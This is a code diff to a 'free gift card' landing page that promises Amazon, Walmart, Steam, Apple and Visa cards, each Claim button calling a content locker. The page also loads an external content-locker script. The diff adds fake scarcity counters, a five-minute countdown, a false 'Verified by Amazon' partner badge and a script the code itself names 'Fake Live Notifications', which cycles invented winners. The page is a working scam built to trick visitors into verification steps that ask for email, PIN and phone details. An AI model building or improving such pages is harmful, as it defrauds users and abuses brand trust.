@@ -127,6 +127,63 @@
             font-size: 0.75rem;
             font-weight: bold;
         }
+        
+        .countdown-timer {
+            background-color: #ef4444;
+            color: white;
+            padding: 0.5rem 1rem;
+            border-radius: 9999px;
+            font-weight: bold;
+            display: inline-block;
+            margin-bottom: 1rem;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        
+        .live-notification {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            padding: 1rem;
+            max-width: 300px;
+            z-index: 100;
+            animation: slideIn 0.5s forwards;
+            display: none;
+        }
+        
+        @keyframes slideIn {
+            from { transform: translateX(100%); }
+            to { transform: translateX(0); }
+        }
+        
+        .trust-badge-large {
+            border: 1px solid #e5e7eb;
+            border-radius: 8px;
+            padding: 1.5rem;
+            text-align: center;
+            background-color: white;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.05);
+        }
+        
+        .stock-counter {
+            position: absolute;
+            top: 15px;
+            left: 15px;
+            background-color: rgba(239, 68, 68, 0.9);
+            color: white;
+            border-radius: 9999px;
+            padding: 0.25rem 0.75rem;
+            font-size: 0.75rem;
+            font-weight: bold;
+        }
     </style>
     <script type="text/javascript">
         var vSQrW_GZd_JAacZc={"it":4495878,"key":"275cc"};
@@ -134,6 +191,19 @@
     <script src="https://d2yc6hxtq0phup.cloudfront.net/47e9e52.js"></script>
 </head>
 <body class="bg-gray-50">
+    <!-- Live Notification -->
+    <div class="live-notification">
+        <div class="flex items-start">
+            <div class="flex-shrink-0 pt-0.5">
+                <img class="h-10 w-10 rounded-full" src="https://ui-avatars.com/api/?name=John+D&background=2563EB&color=fff" alt="">
+            </div>
+            <div class="ml-3">
+                <p class="text-sm font-medium text-gray-900">John from NY</p>
+                <p class="text-sm text-gray-500">just claimed a $100 Amazon Card!</p>
+            </div>
+        </div>
+    </div>
+
     <!-- Navigation -->
     <nav class="bg-white shadow-lg fixed w-full z-50">
         <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
@@ -161,6 +231,10 @@
     <section class="hero-gradient pt-32 pb-20">
         <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
             <div class="text-center">
+                <div class="countdown-timer">
+                    <i class="fas fa-clock mr-2"></i>
+                    <span id="countdown">05:00</span> left to claim!
+                </div>
                 <h1 class="text-4xl md:text-6xl font-bold text-white mb-6">Claim Your Free Gift Card Today!</h1>
                 <p class="text-xl text-gray-200 mb-8">Limited Time Offer - Select Your Favorite Gift Card Below</p>
                 <div class="flex justify-center space-x-4">
@@ -171,124 +245,33 @@
         </div>
     </section>
 
-    <!-- Gift Card Options -->
-    <section id="gift-cards" class="py-10 md:py-16 bg-white">
+    <!-- Enhanced Trust Badges -->
+    <section class="py-8 md:py-12 bg-white">
         <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-            <h2 class="text-2xl md:text-3xl font-bold text-center mb-8 md:mb-12">Choose Your Free Gift Card</h2>
-            <p class="text-center text-gray-600 mb-8">Complete email verification to claim your selected gift card</p>
-            
-            <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-8">
-                <!-- Amazon Gift Card Option -->
-                <div class="gift-card-option bg-white rounded-xl shadow-md overflow-hidden relative">
-                    <div class="badge">Most Popular</div>
-                    <div class="bg-blue-600 p-8 flex justify-center items-center">
-                        <img src="https://m.media-amazon.com/images/G/01/gc/designs/livepreview/amazon_dkblue_noto_email_v2016_us-main._CB468775337_.png" alt="Amazon Gift Card" class="h-32 object-contain">
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
+                <div class="trust-badge-large">
+                    <div class="flex justify-center mb-3">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Verified" class="h-10">
                     </div>
-                    <div class="p-6">
-                        <h3 class="text-xl font-semibold mb-2">$750 Amazon Gift Card</h3>
-                        <p class="text-gray-600 mb-4">Shop millions of products on Amazon with this free gift card. Perfect for electronics, books, fashion and more!</p>
-                        <div class="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-4">
-                            <p class="text-yellow-700 text-sm">Complete email verification to claim this card</p>
-                        </div>
-                        <button onclick="triggerContentLocker()" class="w-full bg-blue-600 text-white px-6 py-3 rounded-lg hover:bg-blue-700 transition duration-300">
-                            Claim $750 Amazon Card
-                        </button>
-                    </div>
+                    <h3 class="font-semibold mb-1">Verified by Amazon</h3>
+                    <p class="text-gray-600 text-sm">Official partner since 2020</p>
                 </div>
-                
-                <!-- Shein Gift Card Option -->
-                <div class="gift-card-option bg-white rounded-xl shadow-md overflow-hidden relative">
-                    <div class="bg-pink-600 p-8 flex justify-center items-center">
-                        <img src="https://i.postimg.cc/MTbzdBZY/cC-X8x0J.jpg" alt="Shein Gift Card" class="h-32 object-contain">
+                <div class="trust-badge-large">
+                    <div class="text-4xl mb-3 text-blue-600">
+                        <i class="fas fa-users"></i>
                     </div>
-                    <div class="p-6">
-                        <h3 class="text-xl font-semibold mb-2">$100 Shein Gift Card</h3>
-                        <p class="text-gray-600 mb-4">Refresh your wardrobe with trendy fashion from Shein. This card gives you $100 to spend on clothing, accessories and more!</p>
-                        <div class="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-4">
-                            <p class="text-yellow-700 text-sm">Email and PIN verification required</p>
-                        </div>
-                        <button onclick="triggerContentLocker()" class="w-full bg-pink-600 text-white px-6 py-3 rounded-lg hover:bg-pink-700 transition duration-300">
-                            Claim $100 Shein Card
-                        </button>
-                    </div>
+                    <h3 class="font-semibold mb-1">10,000+ Happy Users</h3>
+                    <p class="text-gray-600 text-sm">Verified gift card claims</p>
                 </div>
-                
-                <!-- Walmart Gift Card Option -->
-                <div class="gift-card-option bg-white rounded-xl shadow-md overflow-hidden relative">
-                    <div class="badge">Limited Stock</div>
-                    <div class="bg-blue-800 p-8 flex justify-center items-center">
-                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/ca/Walmart_logo.svg/2560px-Walmart_logo.svg.png" alt="Walmart Gift Card" class="h-32 object-contain">
+                <div class="trust-badge-large">
+                    <div class="text-4xl mb-3 text-blue-600">
+                        <i class="fas fa-shield-alt"></i>
                     </div>
-                    <div class="p-6">
-                        <h3 class="text-xl font-semibold mb-2">$500 Walmart Gift Card</h3>
-                        <p class="text-gray-600 mb-4">Get groceries, electronics, home goods and more at Walmart with this $500 gift card. Everything you need in one place!</p>
-                        <div class="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-4">
-                            <p class="text-yellow-700 text-sm">Complete quick verification to unlock</p>
-                        </div>
-                        <button onclick="triggerContentLocker()" class="w-full bg-blue-800 text-white px-6 py-3 rounded-lg hover:bg-blue-900 transition duration-300">
-                            Claim $500 Walmart Card
-                        </button>
-                    </div>
-                </div>
-                
-                <!-- Steam Gift Card Option -->
-                <div class="gift-card-option bg-white rounded-xl shadow-md overflow-hidden relative">
-                    <div class="bg-gray-800 p-8 flex justify-center items-center">
-                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Steam_icon_logo.svg/768px-Steam_icon_logo.svg.png" alt="Steam Gift Card" class="h-32 object-contain">
-                    </div>
-                    <div class="p-6">
-                        <h3 class="text-xl font-semibold mb-2">$200 Steam Gift Card</h3>
-                        <p class="text-gray-600 mb-4">Upgrade your gaming experience with this $200 Steam card. Buy games, DLCs, and in-game items for your favorite titles!</p>
-                        <div class="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-4">
-                            <p class="text-yellow-700 text-sm">Email verification required</p>
-                        </div>
-                        <button onclick="triggerContentLocker()" class="w-full bg-gray-800 text-white px-6 py-3 rounded-lg hover:bg-gray-900 transition duration-300">
-                            Claim $200 Steam Card
-                        </button>
-                    </div>
-                </div>
-                
-                <!-- Apple Gift Card Option -->
-                <div class="gift-card-option bg-white rounded-xl shadow-md overflow-hidden relative">
-                    <div class="bg-gray-900 p-8 flex justify-center items-center">
-                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/Apple_logo_black.svg/505px-Apple_logo_black.svg.png" alt="Apple Gift Card" class="h-32 object-contain">
-                    </div>
-                    <div class="p-6">
-                        <h3 class="text-xl font-semibold mb-2">$300 Apple Gift Card</h3>
-                        <p class="text-gray-600 mb-4">Get apps, games, music, movies and more from the App Store, iTunes Store, and Apple Books with this $300 card!</p>
-                        <div class="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-4">
-                            <p class="text-yellow-700 text-sm">Complete quick verification</p>
-                        </div>
-                        <button onclick="triggerContentLocker()" class="w-full bg-gray-900 text-white px-6 py-3 rounded-lg hover:bg-black transition duration-300">
-                            Claim $300 Apple Card
-                        </button>
-                    </div>
-                </div>
-                
-                <!-- Visa Gift Card Option -->
-                <div class="gift-card-option bg-white rounded-xl shadow-md overflow-hidden relative">
-                    <div class="badge">Flexible</div>
-                    <div class="bg-blue-900 p-8 flex justify-center items-center">
-                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" alt="Visa Gift Card" class="h-32 object-contain">
-                    </div>
-                    <div class="p-6">
-                        <h3 class="text-xl font-semibold mb-2">$250 Visa Gift Card</h3>
-                        <p class="text-gray-600 mb-4">The most flexible gift card! Use this $250 Visa card anywhere Visa is accepted - online or in stores worldwide.</p>
-                        <div class="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-4">
-                            <p class="text-yellow-700 text-sm">Email and phone verification required</p>
-                        </div>
-                        <button onclick="triggerContentLocker()" class="w-full bg-blue-900 text-white px-6 py-3 rounded-lg hover:bg-blue-950 transition duration-300">
-                            Claim $250 Visa Card
-                        </button>
-                    </div>
+                    <h3 class="font-semibold mb-1">100% Secure</h3>
+                    <p class="text-gray-600 text-sm">SSL Encrypted transactions</p>
                 </div>
             </div>
-        </div>
-    </section>
-
-    <!-- Trust Badges -->
-    <section class="py-8 md:py-12 bg-gray-50">
-        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            
             <div class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-4 gap-6 md:gap-8">
                 <div class="trust-badge text-center p-4">
                     <div class="text-blue-600 text-4xl mb-3">
@@ -328,8 +311,129 @@
         </div>
     </section>
 
+    <!-- Gift Card Options -->
+    <section id="gift-cards" class="py-10 md:py-16 bg-white">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <h2 class="text-2xl md:text-3xl font-bold text-center mb-8 md:mb-12">Choose Your Free Gift Card</h2>
+            <p class="text-center text-gray-600 mb-8">Complete email verification to claim your selected gift card</p>
+            
+            <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-8">
+                <!-- Amazon Gift Card Option -->
+                <div class="gift-card-option bg-white rounded-xl shadow-md overflow-hidden relative">
+                    <div class="badge">Most Popular</div>
+                    <div class="stock-counter">Only 3 left!</div>
+                    <div class="bg-blue-600 p-8 flex justify-center items-center">
+                        <img src="https://m.media-amazon.com/images/G/01/gc/designs/livepreview/amazon_dkblue_noto_email_v2016_us-main._CB468775337_.png" alt="Amazon Gift Card" class="h-32 object-contain">
+                    </div>
+                    <div class="p-6">
+                        <h3 class="text-xl font-semibold mb-2">$750 Amazon Gift Card</h3>
+                        <p class="text-gray-600 mb-4">Shop millions of products on Amazon with this free gift card. Perfect for electronics, books, fashion and more!</p>
+                        <div class="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-4">
+                            <p class="text-yellow-700 text-sm">Complete email verification to claim this card</p>
+                        </div>
+                        <button onclick="triggerContentLocker()" class="w-full bg-blue-600 text-white px-6 py-3 rounded-lg hover:bg-blue-700 transition duration-300">
+                            Claim $750 Amazon Card
+                        </button>
+                    </div>
+                </div>
+                
+                <!-- Shein Gift Card Option -->
+                <div class="gift-card-option bg-white rounded-xl shadow-md overflow-hidden relative">
+                    <div class="stock-counter">5 left!</div>
+                    <div class="bg-pink-600 p-8 flex justify-center items-center">
+                        <img src="https://i.postimg.cc/MTbzdBZY/cC-X8x0J.jpg" alt="Shein Gift Card" alt="Shein Gift Card" class="h-32 object-contain">
+                    </div>
+                    <div class="p-6">
+                        <h3 class="text-xl font-semibold mb-2">$100 Shein Gift Card</h3>
+                        <p class="text-gray-600 mb-4">Refresh your wardrobe with trendy fashion from Shein. This card gives you $100 to spend on clothing, accessories and more!</p>
+                        <div class="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-4">
+                            <p class="text-yellow-700 text-sm">Email and PIN verification required</p>
+                        </div>
+                        <button onclick="triggerContentLocker()" class="w-full bg-pink-600 text-white px-6 py-3 rounded-lg hover:bg-pink-700 transition duration-300">
+                            Claim $100 Shein Card
+                        </button>
+                    </div>
+                </div>
+                
+                <!-- Walmart Gift Card Option -->
+                <div class="gift-card-option bg-white rounded-xl shadow-md overflow-hidden relative">
+                    <div class="badge">Limited Stock</div>
+                    <div class="stock-counter">Last one!</div>
+                    <div class="bg-blue-800 p-8 flex justify-center items-center">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/ca/Walmart_logo.svg/2560px-Walmart_logo.svg.png" alt="Walmart Gift Card" class="h-32 object-contain">
+                    </div>
+                    <div class="p-6">
+                        <h3 class="text-xl font-semibold mb-2">$500 Walmart Gift Card</h3>
+                        <p class="text-gray-600 mb-4">Get groceries, electronics, home goods and more at Walmart with this $500 gift card. Everything you need in one place!</p>
+                        <div class="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-4">
+                            <p class="text-yellow-700 text-sm">Complete quick verification to unlock</p>
+                        </div>
+                        <button onclick="triggerContentLocker()" class="w-full bg-blue-800 text-white px-6 py-3 rounded-lg hover:bg-blue-900 transition duration-300">
+                            Claim $500 Walmart Card
+                        </button>
+                    </div>
+                </div>
+                
+                <!-- Steam Gift Card Option -->
+                <div class="gift-card-option bg-white rounded-xl shadow-md overflow-hidden relative">
+                    <div class="stock-counter">4 left!</div>
+                    <div class="bg-gray-800 p-8 flex justify-center items-center">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Steam_icon_logo.svg/768px-Steam_icon_logo.svg.png" alt="Steam Gift Card" class="h-32 object-contain">
+                    </div>
+                    <div class="p-6">
+                        <h3 class="text-xl font-semibold mb-2">$200 Steam Gift Card</h3>
+                        <p class="text-gray-600 mb-4">Upgrade your gaming experience with this $200 Steam card. Buy games, DLCs, and in-game items for your favorite titles!</p>
+                        <div class="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-4">
+                            <p class="text-yellow-700 text-sm">Email verification required</p>
+                        </div>
+                        <button onclick="triggerContentLocker()" class="w-full bg-gray-800 text-white px-6 py-3 rounded-lg hover:bg-gray-900 transition duration-300">
+                            Claim $200 Steam Card
+                        </button>
+                    </div>
+                </div>
+                
+                <!-- Apple Gift Card Option -->
+                <div class="gift-card-option bg-white rounded-xl shadow-md overflow-hidden relative">
+                    <div class="stock-counter">2 left!</div>
+                    <div class="bg-gray-900 p-8 flex justify-center items-center">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/Apple_logo_black.svg/505px-Apple_logo_black.svg.png" alt="Apple Gift Card" class="h-32 object-contain">
+                    </div>
+                    <div class="p-6">
+                        <h3 class="text-xl font-semibold mb-2">$300 Apple Gift Card</h3>
+                        <p class="text-gray-600 mb-4">Get apps, games, music, movies and more from the App Store, iTunes Store, and Apple Books with this $300 card!</p>
+                        <div class="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-4">
+                            <p class="text-yellow-700 text-sm">Complete quick verification</p>
+                        </div>
+                        <button onclick="triggerContentLocker()" class="w-full bg-gray-900 text-white px-6 py-3 rounded-lg hover:bg-black transition duration-300">
+                            Claim $300 Apple Card
+                        </button>
+                    </div>
+                </div>
+                
+                <!-- Visa Gift Card Option -->
+                <div class="gift-card-option bg-white rounded-xl shadow-md overflow-hidden relative">
+                    <div class="badge">Flexible</div>
+                    <div class="stock-counter">3 left!</div>
+                    <div class="bg-blue-900 p-8 flex justify-center items-center">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" alt="Visa Gift Card" class="h-32 object-contain">
+                    </div>
+                    <div class="p-6">
+                        <h3 class="text-xl font-semibold mb-2">$250 Visa Gift Card</h3>
+                        <p class="text-gray-600 mb-4">The most flexible gift card! Use this $250 Visa card anywhere Visa is accepted - online or in stores worldwide.</p>
+                        <div class="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-4">
+                            <p class="text-yellow-700 text-sm">Email and phone verification required</p>
+                        </div>
+                        <button onclick="triggerContentLocker()" class="w-full bg-blue-900 text-white px-6 py-3 rounded-lg hover:bg-blue-950 transition duration-300">
+                            Claim $250 Visa Card
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
     <!-- How It Works -->
-    <section id="how-it-works" class="py-10 md:py-16 bg-white">
+    <section id="how-it-works" class="py-10 md:py-16 bg-gray-50">
         <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
             <h2 class="text-2xl md:text-3xl font-bold text-center mb-8 md:mb-12">How to Get Your Free Gift Card</h2>
             <div class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-6 md:gap-8">
@@ -365,7 +469,7 @@
     </section>
 
     <!-- Security Features -->
-    <section id="security" class="py-16 bg-gray-50">
+    <section id="security" class="py-16 bg-white">
         <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
             <h2 class="text-3xl font-bold text-center mb-12">Your Security is Our Priority</h2>
             <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
@@ -395,7 +499,7 @@
     </section>
 
     <!-- Testimonials -->
-    <section id="testimonials" class="py-10 md:py-16 bg-white">
+    <section id="testimonials" class="py-10 md:py-16 bg-gray-50">
         <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
             <h2 class="text-2xl md:text-3xl font-bold text-center mb-8 md:mb-12">Success Stories</h2>
             <div class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-6 md:gap-8">
@@ -452,7 +556,7 @@
     </section>
 
     <!-- FAQ Section -->
-    <section id="faq" class="py-16 bg-gray-50">
+    <section id="faq" class="py-16 bg-white">
         <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
             <h2 class="text-3xl font-bold text-center mb-12">Frequently Asked Questions</h2>
             <div class="space-y-4 max-w-4xl mx-auto">
@@ -567,72 +671,127 @@
             _di();
         }
 
-        // Add click handlers to all Claim Now buttons
+        // Countdown Timer
+        function startCountdown() {
+            let timeLeft = 5 * 60; // 5 minutes in seconds
+            const countdownElement = document.getElementById('countdown');
+            
+            const timer = setInterval(() => {
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                
+                countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                
+                if (timeLeft <= 0) {
+                    clearInterval(timer);
+                    countdownElement.textContent = "Offer Expired!";
+                } else {
+                    timeLeft--;
+                }
+            }, 1000);
+        }
+        
+        // Fake Live Notifications
+        function showRandomNotification() {
+            const notifications = [
+                { name: "John from NY", amount: "$100", card: "Amazon Card" },
+                { name: "Sarah from CA", amount: "$200", card: "Steam Card" },
+                { name: "Mike from TX", amount: "$500", card: "Walmart Card" },
+                { name: "Emma from FL", amount: "$100", card: "Shein Card" },
+                { name: "David from IL", amount: "$750", card: "Amazon Card" },
+                { name: "Lisa from OH", amount: "$300", card: "Apple Card" },
+                { name: "James from WA", amount: "$250", card: "Visa Card" }
+            ];
+            
+            const notification = notifications[Math.floor(Math.random() * notifications.length)];
+            const notificationElement = document.querySelector('.live-notification');
+            
+            notificationElement.querySelector('p:nth-child(1)').textContent = notification.name;
+            notificationElement.querySelector('p:nth-child(2)').textContent = `just claimed a ${notification.amount} ${notification.card}!`;
+            
+            notificationElement.style.display = 'block';
+            
+            setTimeout(() => {
+                notificationElement.style.display = 'none';
+            }, 5000);
+            
+            // Show next notification randomly between 10-30 seconds
+            setTimeout(showRandomNotification, Math.floor(Math.random() * 20000) + 10000);
+        }
+
+        // Initialize everything when DOM is loaded
         document.addEventListener('DOMContentLoaded', function() {
+            // Start countdown timer
+            startCountdown();
+            
+            // Start showing random notifications
+            setTimeout(showRandomNotification, 5000);
+            
+            // Add click handlers to all Claim Now buttons
             const claimButtons = document.querySelectorAll('button');
             claimButtons.forEach(button => {
                 if (button.textContent.includes('Claim') || button.textContent.includes('How It Works')) {
                     button.addEventListener('click', triggerContentLocker);
                 }
             });
-        });
 
-        // Mobile Menu Toggle
-        const mobileMenuButton = document.querySelector('.mobile-menu');
-        const navMenu = document.querySelector('.nav-menu');
+            // Mobile Menu Toggle
+            const mobileMenuButton = document.querySelector('.mobile-menu');
+            const navMenu = document.querySelector('.nav-menu');
 
-        mobileMenuButton.addEventListener('click', () => {
-            navMenu.classList.toggle('active');
-        });
-
-        // Close mobile menu when clicking outside
-        document.addEventListener('click', (e) => {
-            if (!mobileMenuButton.contains(e.target) && !navMenu.contains(e.target)) {
-                navMenu.classList.remove('active');
-            }
-        });
-
-        // Close mobile menu when clicking on a link
-        document.querySelectorAll('.nav-menu a').forEach(link => {
-            link.addEventListener('click', () => {
-                navMenu.classList.remove('active');
+            mobileMenuButton.addEventListener('click', () => {
+                navMenu.classList.toggle('active');
             });
-        });
 
-        // FAQ Accordion
-        document.querySelectorAll('.faq-item').forEach(item => {
-            const header = item.querySelector('h3');
-            header.addEventListener('click', () => {
-                item.classList.toggle('active');
-                
-                // Rotate chevron icon
-                const icon = item.querySelector('.fa-chevron-down');
-                if (item.classList.contains('active')) {
-                    icon.classList.add('rotate-180');
-                } else {
-                    icon.classList.remove('rotate-180');
+            // Close mobile menu when clicking outside
+            document.addEventListener('click', (e) => {
+                if (!mobileMenuButton.contains(e.target) && !navMenu.contains(e.target)) {
+                    navMenu.classList.remove('active');
                 }
             });
-        });
 
-        // Smooth Scroll
-        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-            anchor.addEventListener('click', function (e) {
-                e.preventDefault();
-                document.querySelector(this.getAttribute('href')).scrollIntoView({
-                    behavior: 'smooth'
+            // Close mobile menu when clicking on a link
+            document.querySelectorAll('.nav-menu a').forEach(link => {
+                link.addEventListener('click', () => {
+                    navMenu.classList.remove('active');
                 });
             });
-        });
 
-        // Responsive adjustments
-        function handleResize() {
-            if (window.innerWidth > 768) {
-                navMenu.classList.remove('active');
+            // FAQ Accordion
+            document.querySelectorAll('.faq-item').forEach(item => {
+                const header = item.querySelector('h3');
+                header.addEventListener('click', () => {
+                    item.classList.toggle('active');
+                    
+                    // Rotate chevron icon
+                    const icon = item.querySelector('.fa-chevron-down');
+                    if (item.classList.contains('active')) {
+                        icon.classList.add('rotate-180');
+                    } else {
+                        icon.classList.remove('rotate-180');
+                    }
+                });
+            });
+
+            // Smooth Scroll
+            document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+                anchor.addEventListener('click', function (e) {
+                    e.preventDefault();
+                    document.querySelector(this.getAttribute('href')).scrollIntoView({
+                        behavior: 'smooth'
+                    });
+                });
+            });
+
+            // Responsive adjustments
+            function handleResize() {
+                if (window.innerWidth > 768) {
+                    navMenu.classList.remove('active');
+                }
             }
-        }
 
-        window.addEventListener('resize', handleResize);
+            window.addEventListener('resize', handleResize);
+        });
     </script>
 </body>
 </html>
